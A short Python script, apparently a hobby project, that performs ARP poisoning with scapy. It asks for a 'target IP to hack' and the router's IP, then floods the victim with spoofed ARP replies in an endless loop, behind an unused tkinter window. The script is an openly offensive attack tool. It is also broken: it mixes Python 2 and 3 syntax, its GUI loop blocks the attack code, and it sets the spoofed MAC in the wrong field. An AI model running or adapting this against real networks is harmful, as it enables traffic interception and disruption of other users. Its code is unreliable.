#!/usr/bin/env python

from scapy.all import *
from subprocess import call
from tkinter import *
import time

fenetre = Tk()

label = Label(fenetre, text="ARP Poisoning in Python")
label.pack()

Canvas(fenetre, width=250, height=100, bg='ivory').pack(side=TOP, padx=5, pady=5)
Button1 = Button(fenetre, text ='Bouton 1').pack(side=LEFT, padx=5, pady=5)
Button2 = Button(fenetre, text ='Bouton 2').pack(side=RIGHT, padx=5, pady=5)


fenetre.mainloop()

def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac
Timeout=2

my_mac = get_mac_address()
if not my_mac:
    print "Cant get local mac address, quitting"
    sys.exit(1)

op=1 # Op code 1 for ARP requests
victim=raw_input('Enter the target IP to hack: ') #person IP to attack
victim=victim.replace(" ","")

spoof=raw_input('Enter the routers IP *SHOULD BE ON SAME ROUTER*: ') #routers IP.. Should be the same one.
spoof=spoof.replace(" ","")

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=my_mac)

while 1:
	send(arp)
	#time.sleep(2)